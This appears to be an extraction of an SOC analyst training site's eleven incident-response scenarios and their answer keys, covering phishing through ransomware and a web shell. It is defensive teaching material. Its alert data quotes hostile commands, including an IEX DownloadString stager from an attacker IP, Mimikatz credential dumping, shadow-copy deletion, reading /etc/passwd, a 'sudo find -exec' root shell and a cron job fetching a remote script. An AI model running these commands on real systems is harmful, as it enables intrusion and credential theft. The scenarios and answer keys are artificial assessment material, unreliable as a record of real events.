# SOC Analyst Certification — Website Extraction

Source site: [https://finish-me.netlify.app/](https://finish-me.netlify.app/)
Analyst name used for access: `Yumul John | 22-08532`

This document extracts the scenario data from the site scenario-by-scenario and includes:

- scenario overview
- alert findings from each subsection
- timeline summary
- case report prompts
- draft case report answers (1–3 sentences each)
- triage questions, correct answers, and explanations

---

## Scenario 1 — Phishing: Malicious Attachment

**Category:** Initial Access  
**Severity:** High

### Overview

A Finance user received an urgent email from a spoofed CFO address. Seconds after opening the attachment, the SIEM triggered multiple alerts on the workstation `WS-FIN-03`.

### Extracted subsections

#### Alert findings

1. **ALT-1041 — Suspicious process spawned from Outlook**
  - Host: `WS-FIN-03 (10.10.5.21)`
  - User: `ana.reyes@corp.ph`
  - Process: `Invoice_Q4.pdf.exe`
  - Parent: `OUTLOOK.EXE`
  - File hash: `d41d8cd98f00b204e9800998ecf8427e`
  - Email sender: `cfo-billing@corp-alerts-ph.net`
  - SPF/DKIM: `FAIL / FAIL`
  - Attachment: `Invoice_Q4.pdf.exe` (double extension)
  - Verdict: malicious spearphishing attachment delivering a dropper
  - MITRE: `T1566.001`, `T1204.002`
2. **ALT-1042 — New executable written to AppData**
  - Path: `C:\Users\ana.reyes\AppData\Local\Temp\svchost32.exe`
  - Written by: `Invoice_Q4.pdf.exe`
  - Signed: `No`
  - AV detection: `None`
  - Verdict: dropper wrote a masquerading payload to temp storage
  - MITRE: `T1027.002`, `T1105`
3. **ALT-1043 — Outbound HTTP GET to uncommon domain**
  - Destination: `http://185.220.101.47/stage2.bin`
  - Process: `svchost32.exe`
  - Protocol: `HTTP`
  - Bytes received: `84,320`
  - Proxy logged: `No`
  - Verdict: secondary payload downloaded from attacker-controlled infrastructure
  - MITRE: `T1071.001`, `T1105`

#### Timeline

- **09:12:38** — Phishing email received
- **09:14:02** — User executed `Invoice_Q4.pdf.exe`
- **09:14:05** — `svchost32.exe` dropped into AppData Temp
- **09:14:09** — Stage-two payload downloaded from `185.220.101.47`

### Case report prompts

- Describe the phishing campaign and what happened on WS-FIN-03.
- How did the attacker initially get code running on the victim machine?
- List the host and user account impacted.
- Reference the MITRE techniques observed across the 3 alerts.
- What should happen to WS-FIN-03 right now?

### Draft case report answers

**Summary:** A spoofed CFO-themed phishing email delivered a malicious attachment disguised as a PDF to Finance user Ana Reyes on `WS-FIN-03`. Once executed, the file dropped `svchost32.exe` into the user temp directory and immediately downloaded a second-stage payload from `185.220.101.47`.

**Initial access:** The attacker achieved code execution through a spearphishing attachment using a double-extension executable, `Invoice_Q4.pdf.exe`, launched from Outlook. The email showed failed SPF and DKIM checks, reinforcing that the message was spoofed.

**Affected assets:** The impacted endpoint is `WS-FIN-03 (10.10.5.21)` and the affected user is `ana.reyes@corp.ph`.

**MITRE TTPs:** Observed techniques include `T1566.001 Spearphishing Attachment`, `T1204.002 Malicious File`, `T1027.002 Masquerading`, `T1105 Ingress Tool Transfer`, and `T1071.001 Web Protocols`.

**Containment:** `WS-FIN-03` should be isolated from the network immediately to stop further payload retrieval and command-and-control activity. Preserve forensic evidence, block the malicious IP/domain, and quarantine the phishing email across the mail environment.

### Triage questions, answers, and explanations

1. **What technique makes `Invoice_Q4.pdf.exe` appear as a PDF to the average user?**
  - **Correct answer:** Double file extension masquerading
  - **Explanation:** Double extensions exploit the fact that Windows often hides known file extensions, causing `Invoice_Q4.pdf.exe` to appear like a harmless PDF to users.
2. **SPF and DKIM both failed. What does this mean for the sender?**
  - **Correct answer:** The sender domain is not authorized to send on behalf of the stated From address
  - **Explanation:** SPF checks whether the sending IP is authorized by the domain owner, while DKIM validates the message signature. Failure of both strongly indicates sender spoofing.
3. **Why would malware drop a file named `svchost32.exe`?**
  - **Correct answer:** To masquerade as the legitimate Windows `svchost.exe` process and evade casual inspection
  - **Explanation:** This is a classic masquerading tactic meant to blend malicious activity into normal-looking Windows process names.
4. **What is the correct immediate containment action for this incident?**
  - **Correct answer:** Isolate `WS-FIN-03` from the network to cut off C2 communication
  - **Explanation:** Isolation disrupts attacker communications, prevents lateral movement, and buys time for investigation and remediation.

---

## Scenario 2 — PowerShell: Obfuscated Execution

**Category:** Execution  
**Severity:** Critical

### Overview

After the phishing compromise, EDR detected an obfuscated PowerShell command launched by the dropped payload on `WS-FIN-03`.

### Extracted subsections

#### Alert findings

1. **ALT-1050 — PowerShell with Base64-encoded argument**
  - Process: `powershell.exe`
  - Parent: `svchost32.exe`
  - Arguments: `-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -enc ...`
  - Integrity: `High (Elevated)`
  - AMSI: `Bypassed`
  - Decoded payload: `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/ps_agent.ps1')`
  - Execution: in-memory, no file written to disk
  - MITRE: `T1059.001`, `T1027`, `T1562.001`
2. **ALT-1051 — AMSI patch detected in PowerShell memory**
  - Technique: `amsi.dll!AmsiScanBuffer patched to return 0`
  - Effect: subsequent scripts bypass AMSI scanning
  - Source: `amsi_patch.ps1`
  - MITRE: `T1562.001`
3. **ALT-1052 — PowerShell script block logging captured malicious content**
  - Event ID: `4104`
  - Content excerpt: `Invoke-Mimikatz; Set-MpPreference -DisableRealtimeMonitoring $true; ...`
  - Modules loaded: `PowerSploit`, `Invoke-Mimikatz`
  - Windows Defender tampered: `Yes`
  - MITRE: `T1059.001`, `T1562.001`, `T1003.001`

#### Timeline

- **09:14:47** — Encoded PowerShell launched by `svchost32.exe`
- **09:14:48** — AMSI patched in PowerShell memory
- **09:14:52** — Remote script executed in memory
- **09:14:55** — Credential theft preparation begins

### Case report prompts

- Describe the obfuscated PowerShell execution and what defenses were bypassed.
- This is continuation of the phishing scenario — note the execution chain.
- Same host WS-FIN-03. Note the SYSTEM context.
- List the 3 MITRE techniques from this scenario.
- Should PowerShell be blocked org-wide? What logging should be enabled?

### Draft case report answers

**Summary:** The dropped malware launched an elevated, Base64-encoded PowerShell stager from `svchost32.exe` on `WS-FIN-03`. The script used `IEX` and `DownloadString` to fetch and execute a remote payload in memory while bypassing AMSI and disabling Windows Defender protections.

**Execution chain:** This activity is a direct continuation of the phishing compromise: malicious attachment → dropped `svchost32.exe` → encoded PowerShell stager → in-memory execution of `ps_agent.ps1`.

**Affected assets:** The activity remained centered on `WS-FIN-03`, but by this stage execution was occurring in elevated/SYSTEM context, increasing the risk of credential theft and defense evasion.

**MITRE TTPs:** The main techniques are `T1059.001 PowerShell`, `T1027 Obfuscated/Compressed Files and Information`, and `T1562.001 Impair Defenses`.

**Containment:** PowerShell should not necessarily be blocked org-wide without a scoped plan, but constrained, monitored, and restricted where unnecessary. Script Block Logging, module logging, AMSI visibility, command-line logging, and strong EDR coverage should be enabled and preserved.

### Triage questions, answers, and explanations

1. **What is the primary purpose of Base64-encoding a PowerShell command with `-enc`?**
  - **Correct answer:** Obfuscating the payload to evade command-line logging and signature detection
  - **Explanation:** Base64 hides readable script content from casual inspection and some security controls that rely on raw command-line visibility.
2. **What does `IEX` combined with `DownloadString` achieve?**
  - **Correct answer:** Downloads a remote script and executes it entirely in memory without writing to disk
  - **Explanation:** This is a classic fileless execution pattern that reduces disk artifacts and bypasses some file-based defenses.
3. **AMSI was patched to always return `clean`. What is the security impact?**
  - **Correct answer:** All script content executed afterward bypasses antivirus scanning, even if malicious
  - **Explanation:** AMSI is meant to inspect scripts before execution. If patched to always return clean, downstream script content becomes effectively invisible to that inspection layer.
4. **Which Windows logging feature would have captured the decoded script content?**
  - **Correct answer:** PowerShell Script Block Logging (Event ID 4104)
  - **Explanation:** Script Block Logging records deobfuscated PowerShell content before execution, making it very useful against encoded payloads.

---

## Scenario 3 — Reverse Shell: C2 Beacon

**Category:** Command and Control  
**Severity:** Critical

### Overview

Firewall telemetry detected a persistent outbound connection from `WS-FIN-03` to a known malicious foreign IP on port `4444`, initiated by a SYSTEM-level PowerShell process.

### Extracted subsections

#### Alert findings

1. **ALT-1060 — Outbound TCP to known C2 IP on port 4444**
  - Source: `10.10.5.21:49321`
  - Destination: `185.220.101.47:4444`
  - Duration: `>10 minutes`
  - Bytes out: `38,492`
  - Process: `powershell.exe (SYSTEM)`
  - Threat intel: Tor exit node, prior Metasploit/Meterpreter reports, blacklisted ASN
  - MITRE: `T1071.001`, `T1572`
2. **ALT-1061 — Periodic beacon every 60 seconds**
  - Jitter: `<2 seconds`
  - Payload size: constant `128 bytes`
  - Protocol: `HTTPS` using self-signed certificate
  - SNI: IP-only, no domain
  - MITRE: `T1071`, `T1132`

#### Timeline

- **09:15:03** — Reverse shell established to `185.220.101.47:4444`
- **09:15:03** — Regular beacons begin
- **09:15:10** — Interactive commands observed
- **09:16:00** — Internal discovery starts

### Case report prompts

- Describe the C2 channel established — protocol, destination, and the level of access gained.
- Continuation from PowerShell execution — note the chain.
- WS-FIN-03 is fully compromised at SYSTEM level.
- Include C2 and Discovery techniques.
- How do you cut the C2 channel without tipping off the attacker prematurely?

### Draft case report answers

**Summary:** `WS-FIN-03` established a persistent SYSTEM-level reverse shell to `185.220.101.47:4444`, consistent with Metasploit/Meterpreter infrastructure. The connection displayed highly regular beaconing behavior and enabled live operator interaction and internal reconnaissance.

**Execution chain:** The C2 channel follows directly from the earlier PowerShell stager and reflects successful remote code execution with elevated privileges.

**Affected assets:** `WS-FIN-03` is fully compromised at SYSTEM level, and attacker activity already includes command execution and network discovery from that host.

**MITRE TTPs:** Relevant techniques include `T1071.001 Web Protocols`, `T1572 Protocol Tunneling`, `T1132 Data Encoding`, and discovery behavior consistent with internal enumeration.

**Containment:** The preferred move is controlled isolation of the endpoint at the network level while preserving volatile evidence and coordinating downstream blocks at the firewall/EDR. Cut the host off from the attacker rapidly, but do so in a way that also captures memory and related telemetry if incident response procedures allow.

### Triage questions, answers, and explanations

1. **Port 4444 with a persistent PowerShell connection to a known C2 IP most likely indicates:**
  - **Correct answer:** An active Meterpreter/reverse shell giving the attacker interactive control
  - **Explanation:** Port 4444 is a common Metasploit listener port, and the persistent SYSTEM-level PowerShell connection is consistent with active remote shell access.
2. **What does a highly regular 60-second beacon interval with minimal jitter suggest?**
  - **Correct answer:** Automated C2 beaconing rather than normal user-driven traffic
  - **Explanation:** Machine-driven command-and-control frameworks often use regular intervals and near-constant payload sizes for check-ins.
3. **Why is the use of a self-signed HTTPS certificate with an IP-only destination suspicious?**
  - **Correct answer:** It indicates encrypted attacker-controlled C2 traffic rather than normal enterprise web usage
  - **Explanation:** Legitimate services typically use domain names and trusted certificates; raw IP + self-signed certs are a common red flag.
4. **What does the evidence imply about attacker capability on WS-FIN-03?**
  - **Correct answer:** The attacker has interactive SYSTEM-level access to the endpoint
  - **Explanation:** The process context, persistence of the session, and interactive command activity all show deep compromise.

---

## Scenario 4 — LSASS Dump: Credential Harvesting

**Category:** Credential Access  
**Severity:** Critical

### Overview

EDR detected an attempt to read LSASS memory on `WS-FIN-03`, and the signature matched Mimikatz.

### Extracted subsections

#### Alert findings

1. **ALT-1070 — Mimikatz signature, LSASS memory access**
  - Tool signature: `Mimikatz v2.2.0`
  - Method: reflective DLL injection, in-memory
  - Command: `sekurlsa::logonpasswords`
  - Credentials obtained: domain admin hash observed
  - MITRE: `T1003.001`, `T1078`
2. **ALT-1071 — SeDebugPrivilege enabled**
  - Privilege: `SeDebugPrivilege — enabled`
  - Timing: enabled immediately before LSASS access
  - MITRE: `T1134`, `T1003.001`

#### Timeline

- **09:17:19** — `SeDebugPrivilege` enabled
- **09:17:21** — `sekurlsa::logonpasswords` executed
- **09:17:22** — `CORP\admin.santos` credential material extracted
- **09:17:25** — Credential data staged for C2 exfiltration

### Case report prompts

- Describe the credential dumping event and the tool used.
- Third phase of the attack chain — credentials obtained via SYSTEM access.
- WS-FIN-03 · Domain account CORP\admin.santos now compromised.
- T1003.001 and any related privilege escalation techniques.
- What needs to happen to the compromised domain admin account immediately?

### Draft case report answers

**Summary:** The attacker used Mimikatz in-memory on `WS-FIN-03` to dump LSASS and extract credential material, including the NTLM hash for `CORP\admin.santos`. Immediately before that, `SeDebugPrivilege` was enabled to gain access to protected process memory.

**Execution chain:** This credential theft is a later phase of the same workstation compromise: phishing execution led to SYSTEM-level PowerShell, which then enabled credential dumping from LSASS.

**Affected assets:** The compromised assets are `WS-FIN-03` and the privileged domain account `CORP\admin.santos`, whose credentials are now assumed stolen.

**MITRE TTPs:** Relevant techniques include `T1003.001 OS Credential Dumping: LSASS Memory`, `T1078 Valid Accounts`, and related privilege abuse such as `T1134 Access Token Manipulation`.

**Containment:** The domain admin account must be disabled or tightly contained immediately, all active sessions and tokens revoked, and the password reset in a controlled manner after scoping impact. Any other credentials present on the host should also be considered potentially compromised.

### Triage questions, answers, and explanations

1. **What does `sekurlsa::logonpasswords` do in Mimikatz?**
  - **Correct answer:** Extracts NTLM hashes and plaintext credentials from LSASS memory
  - **Explanation:** This is one of Mimikatz’s best-known credential dumping commands and directly targets Windows credential material stored in LSASS.
2. **Why did AV fail to detect Mimikatz in this scenario?**
  - **Correct answer:** Mimikatz was executed via reflective DLL injection entirely in memory, leaving no file for AV to scan
  - **Explanation:** In-memory execution reduces or removes the disk artifacts traditional AV engines often rely on.
3. **Why was `SeDebugPrivilege` important here?**
  - **Correct answer:** It allowed the attacker to access and read memory from LSASS
  - **Explanation:** Reading another protected process’s memory generally requires elevated privileges, and enabling this privilege is a strong sign of credential-dumping preparation.
4. **What is the most urgent response for the compromised domain admin account?**
  - **Correct answer:** Force-reset the password and revoke all active sessions and tokens for that account immediately
  - **Explanation:** Once privileged credentials are stolen, they must be treated as fully compromised and unusable until reset and invalidated everywhere.

---

## Scenario 5 — Lateral Movement: Pass-the-Hash to DC

**Category:** Lateral Movement  
**Severity:** Critical

### Overview

Using stolen domain admin credentials, the attacker authenticated from `WS-FIN-03` to `DC01` using NTLM without needing the plaintext password.

### Extracted subsections

#### Alert findings

1. **ALT-1080 — Admin hash reused from compromised host to DC**
  - Source host: `WS-FIN-03 (10.10.5.21)`
  - Target host: `DC01 (10.10.1.5)`
  - Account: `CORP\admin.santos`
  - Logon type: `3 — Network`
  - Auth package: `NTLM`
  - Event IDs: `4624 + 4776`
  - Verdict: Pass-the-Hash confirmed
  - MITRE: `T1550.002`, `T1078.002`
2. **ALT-1081 — Remote service installation on DC01**
  - Tooling: `PsExec`
  - Service: `PSEXESVC`
  - Event ID: `7045`
  - Outcome: attacker gained code execution on the Domain Controller
  - MITRE: `T1021.002`, `T1543.003`

#### Timeline

- **09:22:11** — Pass-the-Hash from `WS-FIN-03` to `DC01`
- **09:22:40** — C2 pivot to `DC01`
- **09:22:45** — `PSEXESVC` installed on `DC01`
- **09:23:00** — Full domain compromise achieved

### Case report prompts

- Document the lateral movement from the workstation to the DC and what access level was achieved.
- NTLM hash obtained in previous scenario used here.
- DC01 (10.10.1.5) — full domain compromise.
- T1550.002 Pass-the-Hash and PsExec lateral movement techniques.
- What needs to happen at the network and AD level immediately?

### Draft case report answers

**Summary:** The attacker reused the stolen NTLM hash of `CORP\admin.santos` from `WS-FIN-03` to authenticate to `DC01` using NTLM, confirming a Pass-the-Hash attack. They then used PsExec to install `PSEXESVC`, giving them remote code execution on the Domain Controller and effectively full domain control.

**Execution chain:** This phase directly follows the LSASS dump, where the attacker harvested the admin hash and used it for lateral movement without cracking or knowing the plaintext password.

**Affected assets:** `DC01 (10.10.1.5)` is compromised, and the blast radius extends to Active Directory and any systems reachable through domain admin privileges.

**MITRE TTPs:** Relevant techniques include `T1550.002 Pass the Hash`, `T1078.002 Domain Accounts`, `T1021.002 SMB/Windows Admin Shares`, and `T1543.003 Create or Modify System Process: Windows Service`.

**Containment:** Immediate actions should include isolating the source and destination systems, disabling or restricting the compromised admin account, blocking lateral admin channels where possible, and initiating emergency AD containment procedures. Any trust in the Domain Controller should be treated as broken until re-scoped and remediated.

### Triage questions, answers, and explanations

1. **What is a Pass-the-Hash attack?**
  - **Correct answer:** Authenticating directly using a stolen NTLM hash without needing the plaintext password
  - **Explanation:** NTLM authentication can accept the hash itself, so the attacker can reuse it directly for access.
2. **Logon Type 3 from a Finance workstation to a Domain Controller via NTLM is suspicious because:**
  - **Correct answer:** It indicates a network logon from an unusual source using a privileged account
  - **Explanation:** A Finance workstation is not a normal admin source for domain administration, so this pattern strongly suggests credential misuse.
3. **Why does `PSEXESVC` matter here?**
  - **Correct answer:** It indicates PsExec was used to achieve remote code execution on the Domain Controller
  - **Explanation:** PsExec commonly installs a temporary service named `PSEXESVC` when executing commands remotely over SMB.
4. **What is the operational impact of this scenario?**
  - **Correct answer:** The attacker has effectively achieved full domain compromise
  - **Explanation:** Domain admin access plus code execution on the DC means the attacker can control core identity infrastructure.

---

## Scenario 6 — Ransomware: Mass File Encryption

**Category:** Impact  
**Severity:** Critical

### Overview

Mass encryption activity was detected on `FILESERVER-01`, with network shares impacted and shadow copies deleted.

### Extracted subsections

#### Alert findings

1. **ALT-1090 — Mass file rename to `.LOCKED`**
  - Host: `FILESERVER-01`
  - User: `CORP\admin.santos`
  - Files impacted: `8,412 files in 3 minutes`
  - Ransom note: `!READ_ME.txt`
  - MITRE: `T1486`, `T1490`
2. **ALT-1091 — `vssadmin delete shadows`**
  - Shadow copies deleted
  - Recovery settings tampered
  - Indicates ransomware pre-encryption preparation
  - MITRE: `T1490`, `T1059.003`

#### Timeline

- **09:30:52** — SMB share enumeration
- **09:30:58** — Recovery mechanisms disabled
- **09:31:04** — Encryption begins
- **09:32:00** — Propagation attempts to additional SMB hosts

### Case report prompts

- Describe the ransomware event, what was encrypted, and the recovery impact.
- Attacker used compromised domain admin credentials from previous scenarios.
- FILESERVER-01 · All mapped network shares · Domain-wide risk.
- T1486 and T1490 are key. Note the pre-encryption recovery destruction.
- What are the first 3 actions in the correct sequence for ransomware containment?

### Draft case report answers

**Summary:** The attacker used the compromised domain admin account to deploy ransomware on `FILESERVER-01`, encrypting thousands of files across mapped network shares and appending the `.LOCKED` extension. Prior to encryption, they deleted shadow copies and disabled recovery mechanisms, significantly increasing restoration difficulty.

**Execution chain:** This impact phase follows domain compromise and abuse of privileged credentials obtained earlier in the intrusion chain.

**Affected assets:** `FILESERVER-01`, mapped SMB shares, and potentially additional hosts targeted for propagation are affected, making this a domain-wide business continuity risk.

**MITRE TTPs:** Key techniques include `T1486 Data Encrypted for Impact`, `T1490 Inhibit System Recovery`, and `T1059.003 Windows Command Shell`.

**Containment:** The first actions should be to isolate the affected server and any spreading hosts, disable attacker-used privileged accounts or sessions, and stop ongoing encryption or propagation before beginning restoration decisions. Preserve evidence and confirm backup integrity before any recovery steps.

### Triage questions, answers, and explanations

1. **What does deleting shadow copies accomplish for ransomware operators?**
  - **Correct answer:** It removes built-in Windows recovery options and makes restoration harder
  - **Explanation:** Shadow copies are often a fast recovery path, so attackers delete them to increase leverage and damage.
2. **Why is the use of a compromised domain admin account especially dangerous here?**
  - **Correct answer:** It gives the attacker broad access to file shares and other systems for encryption and spread
  - **Explanation:** High privileges dramatically increase ransomware blast radius across the environment.
3. **What does the `.LOCKED` mass rename pattern indicate?**
  - **Correct answer:** Active file encryption for impact is underway
  - **Explanation:** Bulk renaming with a novel extension is a common operational signal of ransomware encryption.
4. **What should happen first in ransomware containment?**
  - **Correct answer:** Stop the spread by isolating affected systems and cutting attacker access
  - **Explanation:** Until propagation and access are stopped, every minute risks more encryption and broader damage.

---

## Scenario 7 — DNS Tunneling: Data Exfiltration

**Category:** Exfiltration  
**Severity:** High

### Overview

DNS logs showed base64-like TXT query traffic from `WS-FIN-03` to an attacker-controlled domain using an external resolver.

### Extracted subsections

#### Alert findings

1. **ALT-1100 — DNS TXT exfiltration**
  - Host: `WS-FIN-03`
  - Data channel: base64 in subdomain labels
  - Destination domain: `attacker-domain.xyz`
  - Resolver path: DNS-based exfiltration
  - MITRE: `T1048.003`, `T1071.004`
2. **ALT-1101 — Internal DNS bypassed**
  - External resolver: `8.8.8.8`
  - Goal: evade internal DNS visibility and controls
  - MITRE: `T1048`, `T1562`

#### Timeline

- **09:18:55** — DNS TXT tunneling starts
- **09:18:55** — External resolver used
- **09:19:30** — 52 queries send about 4 KB of data
- **09:19:45** — Exfiltration completes

### Case report prompts

- Describe the DNS tunneling technique and what data was likely exfiltrated.
- Post-compromise exfiltration following credential dump.
- WS-FIN-03. Data exfiltrated to attacker-domain.xyz.
- T1048.003 and T1071.004 are the primary techniques.
- What DNS controls should be implemented to prevent this class of attack?

### Draft case report answers

**Summary:** The attacker exfiltrated data from `WS-FIN-03` by embedding base64-encoded payloads into DNS TXT queries for `attacker-domain.xyz`. The traffic was sent via the external resolver `8.8.8.8`, bypassing internal DNS monitoring and likely carrying stolen credential or reconnaissance data.

**Execution chain:** This activity is consistent with post-compromise exfiltration after credential theft and host takeover.

**Affected assets:** `WS-FIN-03` is the exfiltration source, and the stolen data was transmitted to infrastructure controlled by the attacker domain.

**MITRE TTPs:** The main techniques are `T1048.003 Exfiltration Over Alternative Protocol: DNS` and `T1071.004 DNS`, with defense evasion implications from bypassing internal resolvers.

**Containment:** Force all endpoints to use sanctioned internal DNS, block direct outbound DNS to the internet, monitor unusual TXT and high-entropy query patterns, and use DNS filtering or sinkholing where appropriate.

### Triage questions, answers, and explanations

1. **Why are TXT records attractive for DNS tunneling?**
  - **Correct answer:** They can carry larger arbitrary payloads than simple A-record lookups
  - **Explanation:** TXT records are commonly abused because they allow more room for encoded data in the DNS transaction.
2. **Why is using `8.8.8.8` significant in this scenario?**
  - **Correct answer:** It bypasses internal DNS logging, filtering, and sinkholing controls
  - **Explanation:** Direct use of an external resolver reduces enterprise visibility into the DNS exfiltration channel.
3. **What kind of data was likely exfiltrated here?**
  - **Correct answer:** Credential or reconnaissance data collected from the compromised host
  - **Explanation:** The timing aligns with post-compromise credential theft and host enumeration.
4. **Which MITRE techniques best describe this activity?**
  - **Correct answer:** `T1048.003` and `T1071.004`
  - **Explanation:** The attacker is exfiltrating over an alternative protocol, specifically DNS.

---

## Scenario 8 — Brute Force: Admin Portal Compromise

**Category:** Credential Access  
**Severity:** High

### Overview

An attacker brute-forced the `admin@corp.ph` account on the admin portal, succeeding after over 1,200 failed attempts.

### Extracted subsections

#### Alert findings

1. **ALT-1110 — 1,241 failed logins then one successful login**
  - Host: `WEB-ADMIN-01`
  - Target URL: `https://admin.corp.ph/login`
  - Source IP: `91.108.4.77`
  - User-Agent: `Python-requests/2.28.0`
  - Account: `admin@corp.ph`
  - MFA: disabled
  - Password policy: weak
  - Role: `Superadmin`
  - MITRE: `T1110.001`, `T1078`

#### Timeline

- **09:55:00** — Login page enumerated
- **09:55:10** — Automated brute force begins
- **10:05:18** — Successful login
- **10:05:30** — Admin panel enumeration begins

### Case report prompts

- Document the brute force attack, the failed controls, and the access achieved.
- External attacker brute-forced the admin portal login.
- [admin@corp.ph](mailto:admin@corp.ph) account · admin.corp.ph portal
- T1110.001 and T1078.
- What 3 controls would have prevented or limited this attack?

### Draft case report answers

**Summary:** An external actor used automated requests to brute-force the `admin@corp.ph` account on the company admin portal and successfully obtained superadmin access. The compromise succeeded because MFA was disabled, password policy was weak, and the portal lacked effective rate limiting or account lockout controls.

**Initial access:** The attacker gained access by password guessing against the exposed admin login page.

**Affected assets:** The impacted assets are the `admin@corp.ph` account and the `admin.corp.ph` administrative portal.

**MITRE TTPs:** The primary techniques are `T1110.001 Brute Force: Password Guessing` and `T1078 Valid Accounts`.

**Containment:** The most important preventive controls would have been MFA, rate limiting or lockouts, and stronger password policy or conditional access controls. Immediately reset the account, revoke active sessions, and investigate what the attacker accessed after login.

### Triage questions, answers, and explanations

1. **The `Python-requests/2.28.0` User-Agent strongly suggests:**
  - **Correct answer:** An automated brute-force script rather than a human using a normal browser
  - **Explanation:** Python requests is a common library used in scripts and tooling, especially for credential attacks.
2. **Which missing control most directly would have prevented access even if the password was guessed?**
  - **Correct answer:** Multi-factor authentication (MFA)
  - **Explanation:** MFA adds a separate factor, so a guessed password alone is not enough to log in.
3. **Why is the absence of account lockout or rate limiting a major issue?**
  - **Correct answer:** It allowed thousands of rapid password guesses without meaningful resistance
  - **Explanation:** Basic anti-automation controls dramatically reduce the feasibility of brute-force attacks.
4. **What is the impact of compromising a superadmin account?**
  - **Correct answer:** The attacker gains broad administrative control over the portal and potentially related systems or secrets
  - **Explanation:** High-privilege accounts often expose configuration, users, keys, and downstream administrative actions.

---

## Scenario 9 — Insider Threat: Unauthorized PII Exfiltration

**Category:** Data Exfiltration  
**Severity:** High

### Overview

An HR analyst accessed and copied `847` employee PII records to a USB device during off-hours, far above normal behavior.

### Extracted subsections

#### Alert findings

1. **ALT-1120 — Bulk PII download, 40x baseline, off-hours**
  - Host: `WS-HR-11`
  - User: `mark.villanueva`
  - Time: `01:43:07`
  - USB device: `SanDisk 64GB`
  - Baseline deviation: `40x`
  - Context: employee reportedly on PIP / termination risk
  - MITRE: `T1052.001`, `T1005`

#### Timeline

- **01:43:02** — USB inserted
- **01:43:07** — 847 PII records accessed and downloaded
- **01:43:45** — Files copied to USB
- **01:44:30** — USB removed, user logged off

### Case report prompts

- Document the insider threat indicators and the data potentially exfiltrated.
- Authorized user with excessive access at unauthorized hours.
- 847 employee PII records · [mark.villanueva@corp.ph](mailto:mark.villanueva@corp.ph)
- T1052.001 and T1005. Note: this may be insider threat, not external attacker.
- What are the HR, Legal, and technical steps required in the correct order?

### Draft case report answers

**Summary:** `mark.villanueva` accessed and downloaded `847` employee PII records from `WS-HR-11` at `1:43 AM`, approximately 40 times his normal baseline, and copied the files to a USB device. The timing, volume, removable media use, and HR context strongly indicate a potential insider data theft incident.

**Access context:** This was not unauthorized initial access; it was abuse of legitimate access privileges outside normal business patterns.

**Affected assets:** The affected data includes `847` employee PII records, and the primary user of concern is `mark.villanueva@corp.ph`.

**MITRE TTPs:** The clearest techniques are `T1005 Data from Local System` and `T1052.001 Exfiltration over USB`.

**Containment:** HR, Legal, and Security should coordinate immediately under a formal insider-threat process, preserving evidence before confronting the employee or seizing devices. Access should be limited in a controlled way, legal hold considered, and privacy breach obligations assessed.

### Triage questions, answers, and explanations

1. **Why is this scenario better classified as a potential insider threat than a typical external attack?**
  - **Correct answer:** The user had legitimate access but used it abnormally and potentially maliciously
  - **Explanation:** Insider threat cases often involve misuse of valid access rather than external intrusion.
2. **What makes the USB connection especially important here?**
  - **Correct answer:** It provides a likely physical exfiltration path for the downloaded data
  - **Explanation:** The sequence of bulk download followed by USB copy is a strong exfiltration pattern.
3. **Why does the off-hours timing matter?**
  - **Correct answer:** It materially increases suspicion because the activity falls outside normal behavior patterns
  - **Explanation:** Behavioral anomalies such as unusual time of access are key context in insider investigations.
4. **What is the most important immediate handling principle?**
  - **Correct answer:** Preserve evidence and coordinate with HR and Legal before taking confrontational action
  - **Explanation:** Insider cases often have employment and legal implications, so process discipline matters.

---

## Scenario 10 — Web Shell: Persistent Server Backdoor

**Category:** Persistence  
**Severity:** Critical

### Overview

A previously unknown PHP file was found in the WordPress web root and was actively being used with command parameters from an external IP.

### Extracted subsections

#### Alert findings

1. **ALT-1130 — Unauthorized PHP file in web root**
  - Host: `WEB-01`
  - Path: `/var/www/html/wp-content/uploads/shell.php`
  - User: `www-data`
  - Remote IP: `91.108.4.77`
  - Commands observed: `id`, `whoami`, `uname -a`, `cat /etc/passwd`, `ls /var/www`
  - Reverse shell later spawned to `91.108.4.77:9001`
  - MITRE: `T1505.003`, `T1059.004`

#### Timeline

- **10:58:00** — WordPress upload flaw exploited
- **11:02:44** — Web shell first accessed
- **11:02:50** — Reconnaissance commands run
- **11:15:00** — Reverse shell spawned

### Case report prompts

- Describe the web shell, how it was likely placed, and the level of access it provides.
- Unrestricted file upload vulnerability in WordPress.
- WEB-01 · /var/www/html/wp-content/uploads/shell.php
- T1505.003 Web Shell and T1059.004 Unix Shell.
- How do you remove the shell and close the vulnerability without taking the site offline?

### Draft case report answers

**Summary:** `WEB-01` was compromised through an unrestricted WordPress file upload, allowing the attacker to place `shell.php` in the uploads directory. The script functioned as an active web shell, enabling remote command execution as `www-data` and later spawning a reverse shell.

**Access path:** The initial vector was a vulnerable upload mechanism in WordPress that allowed executable PHP content into the web-accessible uploads path.

**Affected assets:** The compromised asset is `WEB-01`, specifically `/var/www/html/wp-content/uploads/shell.php`, with downstream risk to the entire web application stack.

**MITRE TTPs:** The primary techniques are `T1505.003 Web Shell` and `T1059.004 Unix Shell`.

**Containment:** Remove or quarantine the malicious file, block execution from upload directories, patch the upload flaw, and preserve logs and server evidence before cleanup. If uptime matters, this should be done with a controlled maintenance workflow rather than an unscoped takedown.

### Triage questions, answers, and explanations

1. **What does a PHP file in an uploads directory most strongly suggest here?**
  - **Correct answer:** An unrestricted file upload vulnerability was exploited to place a web shell
  - **Explanation:** Upload directories should typically store content, not executable server-side scripts.
2. **Why is `www-data` significant?**
  - **Correct answer:** It shows the shell is executing with the web server’s operating system privileges
  - **Explanation:** That context defines what the attacker can initially access and what privilege escalation paths may follow.
3. **What is the security purpose of disabling script execution in upload directories?**
  - **Correct answer:** It prevents uploaded files from being used as web shells even if upload validation fails
  - **Explanation:** This is a strong compensating control for common file upload issues.
4. **Why is a reverse shell spawned from a web shell especially serious?**
  - **Correct answer:** It upgrades a simple web foothold into an interactive remote command channel
  - **Explanation:** That significantly increases attacker flexibility and persistence.

---

## Scenario 11 — Privilege Escalation: Misconfigured Sudo

**Category:** Privilege Escalation  
**Severity:** High

### Overview

A low-privilege Linux service account exploited a bad sudoers configuration to gain root access using `find -exec`.

### Extracted subsections

#### Alert findings

1. **ALT-1140 — Root shell via `sudo find -exec`**
  - Host: `APPSERVER-02`
  - User: `deploy_svc`
  - Technique: `sudo find / -exec /bin/sh \; -quit`
  - Result: root shell spawned
  - Persistence: cron job created to pull `http://185.220.101.47/cron.sh`
